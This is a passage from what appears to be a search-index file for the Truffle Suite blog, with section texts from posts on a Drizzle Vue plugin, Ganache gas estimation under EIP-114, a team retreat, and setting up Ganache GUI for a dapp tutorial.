that! Also, co-MVPs James and Julien's improved the Vue Plugin and made it a viable tool. In fact, I consider them to be original contributors and am happy to see their continued involvement in the project. Come meet the team and learn about our tools at TruffleCon. We're looking forward to meeting you all! References \u00b6 https://redux.js.org/ https://redux.js.org/api/store#subscribe https://github.com/trufflesuite/drizzle-vue-plugin https://www.youtube.com/watch?v=QH_yLPYQEs4 https://www.youtube.com/watch?v=XaVEZ1ucxac https://www.youtube.com/watch?v=ApJwXfWKl7Q https://www.youtube.com/watch?v=xyoztqeYd6U", "title": "Drizzle Vue - A Truffle Story"}, {"location": "blog/drizzle-vue-a-truffle-story/#about-drizzle", "text": "Drizzle is a Smart Contract Store with a subscription and mutation API that abstracts away the boilerplate for reading and writing smart contract state as well as listening for contract events. Drizzle originated as a helper library for a React project Josh was developing. However he came to realize that the Smart Contract Store was an important piece needed in dapp development as applications start to scale. In Web 2.0 the need to manage and reason about state at scale has led to libraries like [1] Redux . Similarly, we want to give web 3.0 dapp developers these best practices to leverage as their applications grow in complexity.", "title": "About Drizzle"}, {"location": "blog/drizzle-vue-a-truffle-story/#drizzles-unintended-front-end-frameworks-exclusion", "text": "Unfortunately, this is not how Drizzle is understood by developers we interviewed formally and informally. The most common misunderstanding is that Drizzle is coupled with React, the most popular JavaScript front end framework. We can't blame our community as most of our documentation focuses on implementing Dapps using React. Drizzle was initially released with bindings only for React which created this misperception that excluded developers from utilizing other front end frameworks such as Vue and Angular. The problem is that we didn't offer an easy solution for Vue or Angular and our documentation doesn't offer guidance. We want to change this! We want to support all the frameworks!", "title": "Drizzle's Unintended Front End Frameworks Exclusion"}, {"location": "blog/drizzle-vue-a-truffle-story/#a-vue-plugin-side-project", "text": "I felt this was an important problem to solve in order to improve the dapp developer experience. It was important to get Drizzle working for Vue. Unfortunately, I knew nothing about Vue. In previous organizations I was a part of, I would have shied away from pursuing this project. However, at Truffle I felt comfortable and empowered to champion the idea. Josh encouraged me to spend the time needed to study Vue and experiment with the concepts. The basic plan was to: - Use Vuex, Vue's popular State management plugin - Transform Drizzle's redux store to be consumed by Vuex - A redux store as an [2] Observable which would allow us to transform/map drizzle state to a more state pieces that Vuex could consume. - This would allow us to have more efficient UI renders by using RxJS techniques like distinctUntilChanged - Create basic Vue components mimicking drizzle-react-components - Vue's architecture allows us to use the adaptor as a datasource as well as provide basic support for Components that can render the data. This gives Vue developers to use our basic Components to make quick proof of concepts, and the flexibility to create richer Components when they need to. A [3] basic proof of concept eventually surfaced and I was happy with the outcome as it showed a path forward to Angular using this approach with RxJS and can't wait to test it out!", "title": "A Vue Plugin Side Project"}, {"location": "blog/drizzle-vue-a-truffle-story/#collaboration-and-improvements", "text": "Another aspect of Truffle's culture is to promote collaboration and exchange ideas with our community, and meet like minded developers and advocates working on similar problems. We're encouraged to go to meetups and be advocates for this incredible space. I reached out to Julien Klepatch on reddit after seeing his impressive [4] Drizzle overview video and asked for his feedback on the Vue Plugin. His participation, code contribution, code review and feedback clarified the project's direction and generally improved the codebase. Furthermore, he created 3 videos to explain the new plugin. - [5] Drizzle Vue Plugin: overview - [6] Drizzle Vue Plugin: Custom Components - [7] Drizzle Vue Plugin: Events We also run a range of educational programs as part of Truffle University, that amongst other things, teaches developers how to use our full suite of tools. As part of the experience, students are mentored by the team and are encouraged to contribute to open-source projects, such as the Truffle Suite itself. James Kehoe, a developer in our first cohort, uses Vue on a daily basis and took an interest in the plugin. He took the initial design of the Contract Event Logic and turned it into idiomatic Vue. James also improved the documentation and introduced testing to the project. I learned a lot about Vue pairing with James, and look forward to future sessions with him.", "title": "Collaboration And Improvements"}, {"location": "blog/drizzle-vue-a-truffle-story/#take-a-preview", "text": "You can preview the [3] Plugin before we officially release it. Be sure to check out Julien's videos for an excellent walkthrough: [5] Drizzle Vue Plugin: overview , [6] Drizzle Vue Plugin: Custom Components and [7] Drizzle Vue Plugin: Events This project happened because of Truffle's enabling and supportive culture. Truffle is cool like that! Also, co-MVPs James and Julien's improved the Vue Plugin and made it a viable tool. In fact, I consider them to be original contributors and am happy to see their continued involvement in the project. Come meet the team and learn about our tools at TruffleCon. We're looking forward to meeting you all!", "title": "Take A Preview"}, {"location": "blog/drizzle-vue-a-truffle-story/#references", "text": "https://redux.js.org/ https://redux.js.org/api/store#subscribe https://github.com/trufflesuite/drizzle-vue-plugin https://www.youtube.com/watch?v=QH_yLPYQEs4 https://www.youtube.com/watch?v=XaVEZ1ucxac https://www.youtube.com/watch?v=ApJwXfWKl7Q https://www.youtube.com/watch?v=xyoztqeYd6U", "title": "References"}, {"location": "blog/ethereum-gas-exactimation/", "text": "In Ethereum, estimating gas for a given transaction is a tricky problem to solve (especially when attempting to maintain EIP-114 compliance). Most of the well-known Ethereum implementations like Geth \u00b9 and Parity \u00b2 use interval halving (binary search) to estimate gas by running transactions through the EVM until an approximate estimation converges. At Truffle , we decided such an approach was an unnecessarily CPU-intensive solution to the problem and set out to find a (theoretically) more performant and perfectly accurate way of estimating gas. The result? Gas exactimation . In this tutorial, we\u2019ll go over gas exactimation at a high level in order to demonstrate its precision. Complete example available at the following repo . Prerequisites: You should be familiar with Truffle, Ganache, and Solidity. If you need an introduction please consult the following resources: Truffle Quickstart Ganache Quickstart Solidity Documentation EIP-114, or the \u201c1/64ths rule\u201d \u00b6 EIP-114 mandates that certain stackdepth-creating opcodes withhold 1/64th of remaining gas from the stack they create. In practice this means: The gas required for a successful transaction can be greater than the actual gas spent (similar to how gas refunds behave). The extra gas required for a successful transaction varies depending on the transaction\u2019s initial gas amount. A long-standing issue with Ganache has been the fact that we haven\u2019t returned EIP-114 compliant gas estimations. This has caused our gas estimates to be too low in cases where a transaction executed certain opcodes. Gas exactimation addresses this by considering how the gas withheld at any nested stack depth/frame affects the gas needed outside of its execution context. Let\u2019s see it in action. Create a New Truffle Project \u00b6 We will use truffle init to create a new Truffle project and then wire up an example Solidity smart contract and test script. // In a new project directory... $ truffle init Setup an Example Smart Contract \u00b6 With our new project initialized, we will create an example file: ContractFactory.sol . $ touch ./contracts/ContractFactory.sol Our file will have two contracts, Contract and ContractFactory . ContractFactory will have the method createInstance that we will use to create a new empty Contract . // ./contracts/ContractFactory.sol pragma solidity ^0.5.0; contract ContractFactory { function createInstance() public { new Contract(); } } contract Contract { constructor() public {} } Note the new keyword being used to create a new Contract . A valid statement containing the new keyword gets compiled to bytecode containing the CREATE opcode which is subject to the EIP-114 1/64th gas withholding. Write a Test Case \u00b6 Next, we will write a ContractFactory test case. $ touch ./test/ContractFactory.js This test case will deploy ContractFactory to a Ganache test network and use a gas estimate provided by Ganache to create a new Contract . // ./test/ContractFactory.js const ContractFactory = artifacts.require(\"ContractFactory\"); contract(\"ContractFactory\", () => { it(\"...should deploy and successfully call createInstance using the method's provided gas estimate\", async () => { const contractFactoryInstance = await ContractFactory.new(); const gasEstimate = await contractFactoryInstance.createInstance.estimateGas(); const tx = await contractFactoryInstance.createInstance({ gas: gasEstimate }); assert(tx); }); }); A Quick Check \u00b6 Before we run our test, we\u2019ll download the most recent version of Truffle that uses Ganache before gas exactimation. // In the project directory... $ npm i truffle@5.0.13 And we\u2019ll make sure we have the latest version of Truffle installed globally that uses Ganache with gas exactimation. $ npm i -g truffle Testing Before and After \u00b6 $ npx truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert And when we use gas exactimation... $ truffle test ... ... Contract: ContractFactory \u2713 ...should deploy and successfully call createInstance using the method ' s provided gas estimate ( 130ms ) 1 passing ( 143ms ) !!!! Testing Exactimation \u00b6 But is gas exactimation actually exact ? \ud83e\udd14 We\u2019ll open our test file and subtract exactly a single unit of gas from the gasEstimate before sending our test transaction. // ./test/ContractFactory.js const ContractFactory = artifacts.require ( \"ContractFactory\" ) ; contract ( \"ContractFactory\" , () = > { it ( \"...should deploy and successfully call createInstance using the method's provided gas estimate\" , async () = > { const contractFactoryInstance = await ContractFactory.new () ; const gasEstimate = await contractFactoryInstance.createInstance.estimateGas () ; const tx = await contractFactoryInstance.createInstance ({ gas: gasEstimate - 1 }) ; assert ( tx ) ; }) ; }) ; Running our test again against Ganache with gas exactimation... $ truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert Exactimation confirmed \ud83d\ude80. Note: Since the initial release of gas exactimation, an even more performant iteration of the algorithm is currently in review here.", "title": "Ethereum Gas Exactimation"}, {"location": "blog/ethereum-gas-exactimation/#eip-114-or-the-164ths-rule", "text": "EIP-114 mandates that certain stackdepth-creating opcodes withhold 1/64th of remaining gas from the stack they create. In practice this means: The gas required for a successful transaction can be greater than the actual gas spent (similar to how gas refunds behave). The extra gas required for a successful transaction varies depending on the transaction\u2019s initial gas amount. A long-standing issue with Ganache has been the fact that we haven\u2019t returned EIP-114 compliant gas estimations. This has caused our gas estimates to be too low in cases where a transaction executed certain opcodes. Gas exactimation addresses this by considering how the gas withheld at any nested stack depth/frame affects the gas needed outside of its execution context. Let\u2019s see it in action.", "title": "EIP-114, or the \u201c1/64ths rule\u201d"}, {"location": "blog/ethereum-gas-exactimation/#create-a-new-truffle-project", "text": "We will use truffle init to create a new Truffle project and then wire up an example Solidity smart contract and test script. // In a new project directory... $ truffle init", "title": "Create a New Truffle Project"}, {"location": "blog/ethereum-gas-exactimation/#setup-an-example-smart-contract", "text": "With our new project initialized, we will create an example file: ContractFactory.sol . $ touch ./contracts/ContractFactory.sol Our file will have two contracts, Contract and ContractFactory . ContractFactory will have the method createInstance that we will use to create a new empty Contract . // ./contracts/ContractFactory.sol pragma solidity ^0.5.0; contract ContractFactory { function createInstance() public { new Contract(); } } contract Contract { constructor() public {} } Note the new keyword being used to create a new Contract . A valid statement containing the new keyword gets compiled to bytecode containing the CREATE opcode which is subject to the EIP-114 1/64th gas withholding.", "title": "Setup an Example Smart Contract"}, {"location": "blog/ethereum-gas-exactimation/#write-a-test-case", "text": "Next, we will write a ContractFactory test case. $ touch ./test/ContractFactory.js This test case will deploy ContractFactory to a Ganache test network and use a gas estimate provided by Ganache to create a new Contract . // ./test/ContractFactory.js const ContractFactory = artifacts.require(\"ContractFactory\"); contract(\"ContractFactory\", () => { it(\"...should deploy and successfully call createInstance using the method's provided gas estimate\", async () => { const contractFactoryInstance = await ContractFactory.new(); const gasEstimate = await contractFactoryInstance.createInstance.estimateGas(); const tx = await contractFactoryInstance.createInstance({ gas: gasEstimate }); assert(tx); }); });", "title": "Write a Test Case"}, {"location": "blog/ethereum-gas-exactimation/#a-quick-check", "text": "Before we run our test, we\u2019ll download the most recent version of Truffle that uses Ganache before gas exactimation. // In the project directory... $ npm i truffle@5.0.13 And we\u2019ll make sure we have the latest version of Truffle installed globally that uses Ganache with gas exactimation. $ npm i -g truffle", "title": "A Quick Check"}, {"location": "blog/ethereum-gas-exactimation/#testing-before-and-after", "text": "$ npx truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert And when we use gas exactimation... $ truffle test ... ... Contract: ContractFactory \u2713 ...should deploy and successfully call createInstance using the method ' s provided gas estimate ( 130ms ) 1 passing ( 143ms ) !!!!", "title": "Testing Before and After"}, {"location": "blog/ethereum-gas-exactimation/#testing-exactimation", "text": "But is gas exactimation actually exact ? \ud83e\udd14 We\u2019ll open our test file and subtract exactly a single unit of gas from the gasEstimate before sending our test transaction. // ./test/ContractFactory.js const ContractFactory = artifacts.require ( \"ContractFactory\" ) ; contract ( \"ContractFactory\" , () = > { it ( \"...should deploy and successfully call createInstance using the method's provided gas estimate\" , async () = > { const contractFactoryInstance = await ContractFactory.new () ; const gasEstimate = await contractFactoryInstance.createInstance.estimateGas () ; const tx = await contractFactoryInstance.createInstance ({ gas: gasEstimate - 1 }) ; assert ( tx ) ; }) ; }) ; Running our test again against Ganache with gas exactimation... $ truffle test ... ... Error: Returned error: VM Exception while processing transaction: revert Exactimation confirmed \ud83d\ude80. Note: Since the initial release of gas exactimation, an even more performant iteration of the algorithm is currently in review here.", "title": "Testing Exactimation"}, {"location": "blog/first-ever-truffle-retreat/", "text": "This past summer, the Truffle team got together to together to define our roles, our mission statement, and our product roadmap - and had some fun in the process. The Truffle team is fully remote. This has a lot of advantages in that it allows for a wide range of people available to work on your project; but it can also make it difficult to get to know your coworkers. I started Truffle in early 2015 as the sole developer, and it stayed that way for nearly a year and half. John McDowell joined in late 2016, and by the time of the retreat we happily brought Nick D\u2019Andrea and Josh Quintal on board. All interviews happened over Skype. I live in Yakima, Washington. John lives in Victoria, British Columbia. Nick lives in Philadelphia, and Josh lives in Detroit. That\u2019s a lot of distance between us. When we brought Nick and Josh onto the team, it became obvious that we needed to meet up in person to solidify our roles, define responsibilities, and establish our own culture before growing the team even larger. And we wanted to hang out in the woods, at the top of a mountain, and get to know each other. The Location \u00b6 We had our retreat near Victoria, BC where John lives. Nick, Josh and I traveled all day through a series of planes, ferries and car rides to finally arrive at the house around 7 pm. The house sits atop a large hill in Braemer Heights overlooking all of Victoria, and on a good day has a beautiful view of Mt. Baker in the States. The house was the definition of excess for a team of four, especially with only three of us sleeping there. It had five bedrooms and four bathrooms; a deck with a grill; three stories, the topmost containing only an office with 360-degree windows; and loads of wildlife. Unexpectedly, it was only ten minutes away from a Costco, which helped immensely. Even more unexpectedly, this mansion cost us less than three hotel rooms and a coworking space. The Work \u00b6 I had a few specific goals for our retreat: to define everyone\u2019s roles and responsibilities within our team, to define our product roadmap for the next six months, and to create a mission statement for Truffle that our whole team could rally behind. Retrospective \u00b6 We started with a retro. We wanted to evaluate where we were as a team before deciding where we wanted to go in the future. So on Tuesday morning, we sat down and gave praise for what we\u2019ve done well and identified areas where we could improve. I brought a list of business areas that are important for Truffle -- things like development, technical leadership, branding, marketing, etc. -- and we graded ourselves on each of them. This turned out to be an interesting exercise. As the leader of the team you want to say \u201cwe\u2019re doing great\u201d, and not diminish anyone\u2019s efforts -- because, it\u2019s true, we\u2019ve come far for a small team. However, we need to know where we can improve and how different areas of our company, teamwork and products stack up to the rest. In general, we all seemed to agree on the results: Branding and growth have been stellar (e.g., we have a good product that people like to use), but more external communication -- like our technical leadership, our relationship with the Ethereum Foundation, and relationships with some of our VIP users -- could use some improvement. Though these results were mostly subjective judgements, the conversations that resulted helped inform discussions about our roles and future roadmap. Roles & Responsibilities \u00b6 The Truffle team had already doubled in size in 2017, and right before the retreat two new team members -- Ben Burns and Mike Pumphrey -- had accepted offers (welcome!). So we knew we had some work to do regarding defining our roles and how we work together as a team. Before the retreat, I had met separately with Nick, Josh, and John to evaluate how they felt about their current roles at Truffle. We each talked about what they wanted to do both within the team and professionally, and how I could help them get there. Then we used this time at the retreat to reorganize the work so that it aligns with each team member\u2019s personal goals as well as the group\u2019s goals. We created a new org chart and chain of command, including the new team members we knew were coming on. We decided that Josh and John would share design responsibilities for our website, logo design and general aesthetics for all of our products. Ben, who started in October, would take on the internals of the TestRPC (now Ganache ) and related products ensuring we stay up to date with the Ethereum ecosystem. And Mike would be coming on board to wrangle all of our documentation and learning content, eventually molding it into tailored courses we\u2019d offer to individuals and businesses. That just left Nick and I. Though we both knew Nick would work on the internals of Truffle when he was hired, we didn\u2019t know the extent of the work required; in addition to improving Truffle, Nick would be burdened with the arduous task of softly and lovingly ripping my baby from my arms. That is, Truffle\u2019s my baby, and I\u2019ve been nurturing it from day one. In order to build a more functional and growing team, it became clear I\u2019d have to let go of the internal implementation details and focus more on our business and our product, leaving Nick to explore the tool\u2019s technical way forward. This transition has been a great growing experience already, both professionally and personally. We\u2019ll continue to evaluate this structure over the next six months to see how it works out. Mission Statement \u00b6 The next step was to determine why we\u2019re here. The big three questions were: Why are you here? What do you value? And what do you stand for? The point was to elicit each team member\u2019s value systems to get a big picture of what it is we really care about. My original plan for this session was to put each person on the spot and ask them those questions directly. As it turns out, this interrogation technique was not the best way to get meaningful, genuine answers from the team. Luckily, John came up with a better plan. He suggested we have each member of the team write their values on six index cards, and then have the whole team talk about each other\u2019s values, create a big list, and vote on them to determine our company values. The conversation helped us all understand how different we were, and how much our values varied. We expressed everything from receiving good pay to building the distributed ecosystem. In the end, we all agreed why we\u2019re here. Our new mission statement: Truffle builds useful tools for the next generation of blockchain technologies. We enable the growth of the Ethereum and open source communities, help to improve the role of decentralization in society, and empower developers to achieve their goals. Product Roadmap \u00b6 On Thursday, we got into the details of what we\u2019ve been working on at Truffle and where we\u2019re going. This included presentations for new products [SPOILER ALERT!] and discussions about specific features. We\u2019ve been hard at work since we drafted this post, so some you may have heard of already: Truffle 4.0! - with a debugger, improved development and testing experience, and more! Ganache - a personal blockchain for developers. Drizzle - a frontend framework for React and Angular to easily connect Truffle-based projects. Project Hotcakes - a full stack suite for web applications. Live - a browser-based, interactive Truffle IDE. We also talked about revamping our development processes, which included not only how we work together as well as beefing up our continuous integration systems and making it very easy for users to contribute to Truffle projects. Stay tuned for more info! The Fun \u00b6 In the middle of all of this work we wanted to get some bonding time in too. And if you haven\u2019t been to Victoria, it really is gorgeous, and we couldn\u2019t let this trip go to waste. So on Wednesday we got in John\u2019s Honda Element and drove for two hours to Port Renfrew. The hike on paper: beach hike, sun, potentially bears, great outdoorsy time. The hike in reality: We didn\u2019t see any bears, and we got completely rained out of the hike. But, we also took our first Truffle team selfie: And eventually when the rain cleared got this cloudy-but-serene view from the dock at Port Renfrew. And when we got back to the house, we made dinner, played board games, and drank a bunch of wine. So overall, we had some successful bonding time. Going Home \u00b6 Being able to all be in the same room for the first time ever was extremely rewarding. It gave us a great foundation for the future of our working relationships and of Truffle as a whole, and increased our personal relationships in a way you don\u2019t get when working 100% remotely. We\u2019ll definitely be making retreats a recurring part of working at Truffle. Now that we\u2019re all back to work as usual, we\u2019ve already taken the results of the retreat to heart. We\u2019ve implemented our new development processes (info to come soon); revamped our products and offerings to be more in line with each other; have been settling into our new roles amazingly, and with little conflict; and overall we\u2019ve been having a great time. There are a few things I want to make sure I remember coming out of this retreat: You can build more of a relationship with someone in 10 minutes in person than you can in 3 months on Slack. I want to maintain this momentum and rapport. We\u2019ve found that video calls are the closest you can get on a 100% remote team. Going forward, we\u2019re now having one-on-one meetings every week to make sure we can keep up our rapport and ensure we\u2019re giving each other consistent, useful feedback. The right processes and structures are the basis for responsibility, autonomy, and trust between teammates. During the retreat we collectively decided on rules and structure that would help us work better together. These rules were meant to increase responsibility and autonomy and provide a basis of trust in decision-making where each of us are responsible for our own individual specialties. I want to increase this trust and know that each team member can make the right decisions when needed. Building rapport with your teammates is worth the effort. In a remote team you don\u2019t often get the chance to invite your coworker over for dinner or go to a local event. Bridging this gap is hard, and requires conscious effort, but has so many benefits including happiness, morale and general enthusiasm toward coming into work every day. I want to continue to bridge this gap and foster a culture where even if we\u2019re a thousand miles away, we can still feel close enough to have each other over for dinner. Final thought: I\u2019d eat Nick\u2019s caprese salad and Josh\u2019s sirloin medallions any day of the week.", "title": "Our First Ever Truffle Retreat"}, {"location": "blog/first-ever-truffle-retreat/#the-location", "text": "We had our retreat near Victoria, BC where John lives. Nick, Josh and I traveled all day through a series of planes, ferries and car rides to finally arrive at the house around 7 pm. The house sits atop a large hill in Braemer Heights overlooking all of Victoria, and on a good day has a beautiful view of Mt. Baker in the States. The house was the definition of excess for a team of four, especially with only three of us sleeping there. It had five bedrooms and four bathrooms; a deck with a grill; three stories, the topmost containing only an office with 360-degree windows; and loads of wildlife. Unexpectedly, it was only ten minutes away from a Costco, which helped immensely. Even more unexpectedly, this mansion cost us less than three hotel rooms and a coworking space.", "title": "The Location"}, {"location": "blog/first-ever-truffle-retreat/#the-work", "text": "I had a few specific goals for our retreat: to define everyone\u2019s roles and responsibilities within our team, to define our product roadmap for the next six months, and to create a mission statement for Truffle that our whole team could rally behind.", "title": "The Work"}, {"location": "blog/first-ever-truffle-retreat/#retrospective", "text": "We started with a retro. We wanted to evaluate where we were as a team before deciding where we wanted to go in the future. So on Tuesday morning, we sat down and gave praise for what we\u2019ve done well and identified areas where we could improve. I brought a list of business areas that are important for Truffle -- things like development, technical leadership, branding, marketing, etc. -- and we graded ourselves on each of them. This turned out to be an interesting exercise. As the leader of the team you want to say \u201cwe\u2019re doing great\u201d, and not diminish anyone\u2019s efforts -- because, it\u2019s true, we\u2019ve come far for a small team. However, we need to know where we can improve and how different areas of our company, teamwork and products stack up to the rest. In general, we all seemed to agree on the results: Branding and growth have been stellar (e.g., we have a good product that people like to use), but more external communication -- like our technical leadership, our relationship with the Ethereum Foundation, and relationships with some of our VIP users -- could use some improvement. Though these results were mostly subjective judgements, the conversations that resulted helped inform discussions about our roles and future roadmap.", "title": "Retrospective"}, {"location": "blog/first-ever-truffle-retreat/#roles-responsibilities", "text": "The Truffle team had already doubled in size in 2017, and right before the retreat two new team members -- Ben Burns and Mike Pumphrey -- had accepted offers (welcome!). So we knew we had some work to do regarding defining our roles and how we work together as a team. Before the retreat, I had met separately with Nick, Josh, and John to evaluate how they felt about their current roles at Truffle. We each talked about what they wanted to do both within the team and professionally, and how I could help them get there. Then we used this time at the retreat to reorganize the work so that it aligns with each team member\u2019s personal goals as well as the group\u2019s goals. We created a new org chart and chain of command, including the new team members we knew were coming on. We decided that Josh and John would share design responsibilities for our website, logo design and general aesthetics for all of our products. Ben, who started in October, would take on the internals of the TestRPC (now Ganache ) and related products ensuring we stay up to date with the Ethereum ecosystem. And Mike would be coming on board to wrangle all of our documentation and learning content, eventually molding it into tailored courses we\u2019d offer to individuals and businesses. That just left Nick and I. Though we both knew Nick would work on the internals of Truffle when he was hired, we didn\u2019t know the extent of the work required; in addition to improving Truffle, Nick would be burdened with the arduous task of softly and lovingly ripping my baby from my arms. That is, Truffle\u2019s my baby, and I\u2019ve been nurturing it from day one. In order to build a more functional and growing team, it became clear I\u2019d have to let go of the internal implementation details and focus more on our business and our product, leaving Nick to explore the tool\u2019s technical way forward. This transition has been a great growing experience already, both professionally and personally. We\u2019ll continue to evaluate this structure over the next six months to see how it works out.", "title": "Roles &amp; Responsibilities"}, {"location": "blog/first-ever-truffle-retreat/#mission-statement", "text": "The next step was to determine why we\u2019re here. The big three questions were: Why are you here? What do you value? And what do you stand for? The point was to elicit each team member\u2019s value systems to get a big picture of what it is we really care about. My original plan for this session was to put each person on the spot and ask them those questions directly. As it turns out, this interrogation technique was not the best way to get meaningful, genuine answers from the team. Luckily, John came up with a better plan. He suggested we have each member of the team write their values on six index cards, and then have the whole team talk about each other\u2019s values, create a big list, and vote on them to determine our company values. The conversation helped us all understand how different we were, and how much our values varied. We expressed everything from receiving good pay to building the distributed ecosystem. In the end, we all agreed why we\u2019re here. Our new mission statement: Truffle builds useful tools for the next generation of blockchain technologies. We enable the growth of the Ethereum and open source communities, help to improve the role of decentralization in society, and empower developers to achieve their goals.", "title": "Mission Statement"}, {"location": "blog/first-ever-truffle-retreat/#product-roadmap", "text": "On Thursday, we got into the details of what we\u2019ve been working on at Truffle and where we\u2019re going. This included presentations for new products [SPOILER ALERT!] and discussions about specific features. We\u2019ve been hard at work since we drafted this post, so some you may have heard of already: Truffle 4.0! - with a debugger, improved development and testing experience, and more! Ganache - a personal blockchain for developers. Drizzle - a frontend framework for React and Angular to easily connect Truffle-based projects. Project Hotcakes - a full stack suite for web applications. Live - a browser-based, interactive Truffle IDE. We also talked about revamping our development processes, which included not only how we work together as well as beefing up our continuous integration systems and making it very easy for users to contribute to Truffle projects. Stay tuned for more info!", "title": "Product Roadmap"}, {"location": "blog/first-ever-truffle-retreat/#the-fun", "text": "In the middle of all of this work we wanted to get some bonding time in too. And if you haven\u2019t been to Victoria, it really is gorgeous, and we couldn\u2019t let this trip go to waste. So on Wednesday we got in John\u2019s Honda Element and drove for two hours to Port Renfrew. The hike on paper: beach hike, sun, potentially bears, great outdoorsy time. The hike in reality: We didn\u2019t see any bears, and we got completely rained out of the hike. But, we also took our first Truffle team selfie: And eventually when the rain cleared got this cloudy-but-serene view from the dock at Port Renfrew. And when we got back to the house, we made dinner, played board games, and drank a bunch of wine. So overall, we had some successful bonding time.", "title": "The Fun"}, {"location": "blog/first-ever-truffle-retreat/#going-home", "text": "Being able to all be in the same room for the first time ever was extremely rewarding. It gave us a great foundation for the future of our working relationships and of Truffle as a whole, and increased our personal relationships in a way you don\u2019t get when working 100% remotely. We\u2019ll definitely be making retreats a recurring part of working at Truffle. Now that we\u2019re all back to work as usual, we\u2019ve already taken the results of the retreat to heart. We\u2019ve implemented our new development processes (info to come soon); revamped our products and offerings to be more in line with each other; have been settling into our new roles amazingly, and with little conflict; and overall we\u2019ve been having a great time. There are a few things I want to make sure I remember coming out of this retreat: You can build more of a relationship with someone in 10 minutes in person than you can in 3 months on Slack. I want to maintain this momentum and rapport. We\u2019ve found that video calls are the closest you can get on a 100% remote team. Going forward, we\u2019re now having one-on-one meetings every week to make sure we can keep up our rapport and ensure we\u2019re giving each other consistent, useful feedback. The right processes and structures are the basis for responsibility, autonomy, and trust between teammates. During the retreat we collectively decided on rules and structure that would help us work better together. These rules were meant to increase responsibility and autonomy and provide a basis of trust in decision-making where each of us are responsible for our own individual specialties. I want to increase this trust and know that each team member can make the right decisions when needed. Building rapport with your teammates is worth the effort. In a remote team you don\u2019t often get the chance to invite your coworker over for dinner or go to a local event. Bridging this gap is hard, and requires conscious effort, but has so many benefits including happiness, morale and general enthusiasm toward coming into work every day. I want to continue to bridge this gap and foster a culture where even if we\u2019re a thousand miles away, we can still feel close enough to have each other over for dinner. Final thought: I\u2019d eat Nick\u2019s caprese salad and Josh\u2019s sirloin medallions any day of the week.", "title": "Going Home"}, {"location": "blog/from-idea-to-minimum-viable-dapp-how-to-use-ganache-to-enhance-your-auction-dapp/", "text": "By Kingsley Arinze Welcome to the third post of the Truffle series: From idea to minimum viable dapp, where we showcase how to build a dapp from scratch with the Truffle suite. In this post, we\u2019re going to cover how to enhance your auction dapp using Ganache. In part one , we created a new smart contract project in Solidity, compiled and deployed the smart contract, and interacted with it in a development environment using the Truffle CLI. In part two , we built on part one by adding automated unit tests, leveraging the automated test runner and libraries that Truffle CLI makes available. In this post, we\u2019re going to build further on parts one and two by exploring the benefits of using Ganache as our blockchain simulator instead of the built-in blockchain simulator that comes bundled with Truffle CLI. What is Ganache? \u00b6 Ganache is a local blockchain simulator that enables fast and easy dapp development, testing, and deployment on the Ethereum network. It enables developers to simulate the Ethereum virtual machine, allowing smart contracts to interact with it the same way they\u2019d interact with the Ethereum blockchain when deployed. This means that you can expect your smart contract to work on Ganache, the exact same way it would on the Ethereum testnets and mainnet. There are two flavors of Ganache, Ganache Command Line Interface (CLI) and Ganache Graphical User Interface (GUI) . Both flavors have a richer feature set than the built-in Ganache that comes with Truffle CLI, but for this post, we\u2019ll be focusing on Ganache GUI, exploring ways in which adding it to our mix of tools can greatly improve productivity. Suppose you\u2019re interested in using the Ganache CLI interface instead. In that case, you should check out this blog on Ganache 7 and this blog on three new features of Ganache CLI that will improve your development experience . Ganache GUI \u00b6 Ganache GUI is a graphical version of the Ganache CLI, although not as feature-rich as Ganache CLI, it has some cool features that can help improve productivity, such as the ability to create and switch between multiple workspaces, link and unlink Truffle projects, examine blocks and transactions through the built-in block explorer and lots more. You can download a version of the Ganache GUI for your operating system by visiting the Ganache download page . Once you have that downloaded, go ahead and install it as you would any other application. Using Ganache GUI instead of the Truffle CLI built-in blockchain \u00b6 In episode one, under the Deploy contracts locally with Truffle CLI section, we deployed contracts to Truffle\u2019s built-in blockchain simulator and interacted with the deployed contract through the truffle developer console we exposed with the command \u201ctruffle develop\u201d. In episode two, after adding some automated unit tests, we ran our tests against the built-in blockchain that comes with Truffle CLI by first running \u201ctruffle develop\u201d followed by the \u201ctest\u201d command. Recall that running \u201ctruffle develop\u201d exposes an interface for accessing Truffle\u2019s built-in blockchain. In this post, we\u2019re going to be replacing Truffle\u2019s built-in blockchain with the Ganache GUI, since it provides more visibility and features compared to Truffle CLI\u2019s built-in blockchain. To do this successfully, we will need to set up a workspace for our project. Setting up a workspace \u00b6 On the Ganache GUI home screen, there are two options for creating a workspace, the QUICKSTART option, and the NEW WORKSPACE option. The QUICKSTART option helps spin up a blockchain with the default workspace configuration options in a single click, while the NEW WORKSPACE option allows for more flexibility in terms of configuration. Since we already have a working project with a truffle-config.js file, we\u2019ll be using the NEW WORKSPACE option. Click the NEW WORKSPACE button and enter a workspace name for your project, then go ahead and select your project\u2019s truffle-config.js file under the TRUFFLE PROJECTS input field and click SAVE WORKSPACE to continue. If you did that correctly, you should see an ACCOUNTS page. This page is similar to the response from running the \u201ctruffle develop\u201d command in episode one. It creates 10 free Ethereum accounts, each loaded with 100 fake ETH tokens for testing. This page also displays the Mnemonic seed phrase used for generating these accounts, as well as each account's private keys. Replacing Truffle CLI\u2019s built-in blockchain with Ganache GUI \u00b6 We will delve deeper into the other pages and what they do but in the meantime, let\u2019s go ahead and replace Truffle CLI\u2019s built-in blockchain with Ganache GUI in our dapp development workflow. Replacing Truffle CLI\u2019s built-in blockchain with Ganache GUI in our workflow means that contract deployments, interactions, and tests would run against this new blockchain simulator; Ganache GUI, and since it has a user interface, we will have more insight into what happens under the hood. To do this, all we need to do is to update the \u201cdevelopment.port\u201d value inside the truffle-config.js file to point to the port that our Ganache GUI instance exposes, which is usually port 7547. Notice that we currently have that value set to 8545, which is the port on which truffle CLI\u2019s internal blockchain runs - you can see this by running the \u201ctruffle develop\u201d command. Your truffle-config.js file should now look like this: ... development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" , // Any network (default: none) }, ... With the port value updated, we can now deploy our contract to Ganache GUI. To do that, navigate to the project root and run the command \u201ctruffle migrate\u201d. Recall that in previous episodes, to access a blockchain node, we had to first run the \u201ctruffle develop\u201d command to spin up Truffle\u2019s internal blockchain before running the actual commands like \u201cmigrate\u201d and \u201ctest\u201d. Now since we run a standalone Ganache GUI, we can skip the first command - \u201ctruffle develop\u201d entirely and run the actual commands directly. The only requirement is that we prefix all commands with the \u201ctruffle\u201d keyword 